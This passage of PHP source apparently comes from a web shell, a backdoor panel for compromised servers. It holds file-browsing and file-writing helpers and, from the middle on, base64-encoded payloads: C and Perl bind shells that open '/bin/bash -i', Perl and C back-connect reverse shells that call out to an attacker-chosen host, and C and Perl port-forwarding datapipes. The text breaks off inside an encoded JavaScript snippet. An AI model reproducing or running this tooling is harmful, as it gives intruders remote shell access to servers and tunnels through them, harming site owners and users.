echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><font color=red face=tahoma size=-2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
return null;
}
function mr($l,$n)
{
$text['ru']  = array('?? ??????? ????????? ??????','?????? ??????????');
$text['eng'] = array('Can\'t send mail','Mail sent');	
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><font color=red face=tahoma size=-2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
return null;
}
function perms($mode)
{
if ($GLOBALS['windows']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\">";
 return $ret;
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or we($fname);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }	
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
function DirFiles($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (FALSE !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(!is_dir($dir."/".$file))
          {
            if($types)
            {
              $pos = @strrpos($file,".");
              $ext = @substr($file,$pos,@strlen($file)-$pos);
              if(@in_array($ext,@explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  function DirFilesWide($dir)
  {
    $files = Array();
    $dirs = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
          {
            $file = @strtoupper($file);
            $dirs[$file] = '&lt;DIR&gt;';
          }
          else
            $files[$file] = @filesize($dir."/".$file);
        }
      }
      @closedir($handle);
      @ksort($dirs);
      @ksort($files);
      $files = @array_merge($dirs,$files);
    }
    return $files;
  }
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  function DirPrintHTMLHeaders($dir)
  {
    $pockets = '';
  	$handle = @opendir($dir) or die("Can't open directory $dir");
    echo "    <ul style='margin-left: 0px; padding-left: 20px;'>\n";
    while (false !== ($file = @readdir($handle)))
    {
      if ($file != "." && $file != "..")
      {
        if(@is_dir($dir."/".$file))
        {
          echo "      <li><b>[ $file ]</b></li>\n";
          DirPrintHTMLHeaders($dir."/".$file);
        }
        else
        {
          $pos = @strrpos($file,".");
          $ext = @substr($file,$pos,@strlen($file)-$pos);
          if(@in_array($ext,array('.htm','.html')))
          {
            $header = '-=None=-';
            $strings = @file($dir."/".$file) or die("Can't open file ".$dir."/".$file);
            for($a=0;$a<count($strings);$a++)
            {
              $pattern = '(<title>(.+)</title>)';
              if(@eregi($pattern,$strings[$a],$pockets))
              {
                $header = "&laquo;".$pockets[2]."&raquo;";
                break;
              }
            }
            echo "      <li>".$header."</li>\n";
          }
        }
      }
    }
    echo "    </ul>\n";
    @closedir($handle);
  }

  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$shellvic="aENlR3JPdVA=";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
/* $c1 = "PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2
JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l
lPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhkb2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndW
FnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2pzPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L
3NjcmlwdD48c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0MS4yIj5ob3Rsb2dfanM9IjEuMiI7aG90bG9nX3IrPSImd2g9IitzY3JlZW4ud2lkdGgr
J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR
